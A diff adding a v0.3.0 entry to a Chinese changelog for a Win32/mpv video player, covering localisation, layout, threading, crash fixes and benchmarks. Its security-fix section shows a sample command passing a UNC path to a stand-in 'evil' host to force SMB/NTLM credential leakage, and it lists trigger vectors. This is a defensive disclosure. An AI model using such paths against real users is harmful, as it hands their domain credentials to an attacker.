@@ -2,6 +2,102 @@
 
 本项目遵循 [语义化版本](https://semver.org/lang/zh-CN/)。
 
+## [0.3.0] - 2026-10-06
+
+界面文案国际化 + 安装器语言选择、控件尺寸改按文字实测、安全加固、
+解码线程数改按物理核。
+
+### 新增
+
+- **中英文界面**：新增 `lang` 模块集中管理全部面向用户文案。取值顺序：
+  `VIDEOVIEW_LANG` 环境变量 > 安装器写入的注册表 > 系统界面语言 > 英文
+- **安装器语言选择页**：English / 简体中文二选一，装完即生效。注册表分
+  HKLM 与 HKCU 两处读（安装权限有两种）
+- **控件尺寸按当前语言的实测文字宽度计算**（新增 `ui::Metrics`），
+  不再使用写死的 DIP 常量。中文两字与英文单词长度差很多，写死必然有一边
+  被截断（`"Pause"` / `"Volume"` 在原来的 48 DIP 框里放不下）
+- **硬件解码状态可观测**：新增 `hwdec-current`，接到 `UiState.hwdec`。
+  D3D11VA 探测失败时 mpv 不发 error 也不发 warning，只是悄悄退回软解，
+  现在这是唯一的观测手段
+- 新增 `cpu` 模块：按**物理核**枚举（`GetLogicalProcessorInformationEx`）
+
+### 变更
+
+- 控制栏三组控件（按钮 / 文件名 / 音量）重新分布：边距 10 → 14 DIP，
+  新增 20 DIP 组间距，文件名从右对齐改为在中间那段居中
+- 播放/暂停、静音/音量取两者较宽者 —— 切换状态时按钮宽度不再变化、
+  整排按钮不跳动
+- 时间码列宽按最坏情况 `88:88:88` 实测，`h:mm:ss` 不再被切
+- `vd-lavc-threads` 改按物理核。原来用 `available_parallelism()`，
+  在 Windows 上那是逻辑核数；i3-3xxx（2 物理核 + 4 线程）会开 4 条解码
+  线程在 2 个核上抢执行单元
+- `hwdec=auto-safe` → `auto`。mpv 文档：两者定义完全相同，
+  `auto-safe` 是早期命名残留
+- 新增 `vd-lavc-dr=no`：d3d11 上下文下它本来就无效，显式写是记录
+  「这条路径不依赖 DR」
+- 安装器新增 `SetRegView 64`。makensis 是 32 位进程，
+  `RequestExecutionLevel` 只提权不切注册表视图
+- 播放时不再每帧把整个客户区填成黑色。mpv 的子窗口把视频区整个盖住，
+  4K 下这是每次 `WM_PAINT` 830 万次写像素的纯浪费
+- mpv 层与启动层的错误信息改为英文（面向用户的部分已按语言本地化）
+
+### 修复
+
+- **UNC 路径可被强制发起 SMB/NTLM 认证**（高危）。
+  `video-view.exe "\\evil\share\a.mp4"` 一个命令行参数就能让受害者进程
+  用自己的凭据去连攻击者的共享交出域凭据；`.lnk`、注册表
+  `shell\open\command`、任何 `CreateProcess` 的调用方都能触发。现在挡在
+  `is_file()` **之前**（`metadata()` 自己就会建 SMB 连接），同时挡掉
+  扩展 UNC、设备路径、`//` 正斜杠 UNC、ADS 与依赖 CWD 的相对路径
+- **`WM_CREATE` 里弹 MessageBox**（高危）。那是在 `CreateWindowExW`
+  尚未返回时嵌套跑一个模态消息循环：用户按 Esc 会造成「窗口已在创建中
+  被销毁 + 返回 -1」这个未定义组合，且嵌套循环里能撞上
+  `panic = "abort"` 下的静默闪退。改成存进 `create_error`，窗口创建
+  彻底结束后再弹。顺带修掉 `WM_CREATE` 返回 -1 时 `GetLastError`
+  不被设置、错误显示成「操作成功完成」
+- **启动时序**（高危）。原来 `SetTimer` 在 `WM_CREATE` 里武装，而消息
+  循环要等整个 `MpvPlayer::new`（D3D11 初始化几百毫秒）之后才开始。
+  这段窗口里任何一次消息泵被跑起来就会 `WM_TIMER` → `player()` →
+  `expect()` → `panic = "abort"` 下整个进程静默消失。定时器挪到
+  `player` 就位之后，并加 `pump_messages()` 抽干创建期积压的绘制消息
+- 打开文件失败后界面卡在「已加载但没在播」：文件名显示着、按钮亮着，
+  而画面区露出后备位图里的旧内容。现在退回空闲态
+- 注册表读取加 64 字节上限：`HKCU\Software\VideoView\Language` 是用户
+  可写的，一个 64MB 的值就能让每次启动分配 128MB
+- `clamp_to_client` 对负客户区尺寸不再 panic（`i32::clamp` 在
+  `min > max` 时 panic，`panic = "abort"` 下就是整个进程消失）
+- 字体创建失败时不再往常驻后备位图 DC 上 `SelectObject(hdc, NULL)`
+  —— 那会让 DC 进入无选中对象状态，之后 `BitBlt` 静默失败、控制栏整会话
+  空白且零日志。同时还原 `SetBkMode`
+- 9 处 `lock().unwrap()` 改成防中毒版本（`surface.rs` 的测试里本来就是
+  对的，产品代码一处都没有）
+
+### 文档
+
+- 纠正了 `demuxer-*` 三项配置的注释。它们在本地文件播放路径下**不生效**：
+  mpv 的 `demux.c` 里 `use_cache = is_streaming`，本地文件
+  `streaming = false` → `seekable_cache = false` → 缓存根本不分配。
+  原来「实测默认配置下光这一项就吃掉上百 MB」的结论与代码路径矛盾
+- `package.ps1` 新增 `app.manifest` 程序集清单版本校验。它与 exe 的
+  `FileVersion` 是两个独立的版本号，只查后者抓不到清单版本漂移
+
+### 性能实测
+
+125% 缩放、H.264 640×480、`hwdec-current = d3d11va`：
+
+| 状态 | 窗口 | 工作集 | private | CPU | GPU 3D | GPU 解码 |
+| --- | --- | --- | --- | --- | --- | --- |
+| 空闲 | 1082×673 | 49 MB | 33 MB | 0.1–3% | ~0 | ~0 |
+| 播放 | 1082×673 | 135 MB | 115 MB | 9.9% | 4.0% | 0.7% |
+| 播放 | 1882×953 | 142 MB | 122 MB | 9.2% | 7.4% | 0.8% |
+
+连续播放 60 秒工作集无增长。播放时那 135 MB 里有 62.7 MB 是三个 Intel
+驱动模块（`igc64.dll` / `igd11dxva64.dll` / `igd10umdgen11.dll`），是
+D3D11 渲染路径的固定开销 —— 关掉硬件解码内存几乎不变（110.8 → 106.4 MB），
+所以保留硬件解码（它更省 CPU）。
+
+测试素材最大只有 640×480，因此表中的 GPU 解码占用**不代表 1080p/4K**。
+
 ## [0.2.0] - 2026-10-05
 
 界面从 Tauri + WebView2 换成原生 Win32 + GDI 自绘。起因是用户反馈
@@ -157,5 +253,6 @@
 - 不支持播放列表、字幕轨选择、音视频轨切换
 - 不支持网络流
 
+[0.3.0]: https://github.com/Liu-bits/video-view/releases/tag/v0.3.0
 [0.2.0]: https://github.com/Liu-bits/video-view/releases/tag/v0.2.0
 [0.1.0]: https://github.com/Liu-bits/video-view/releases/tag/v0.1.0
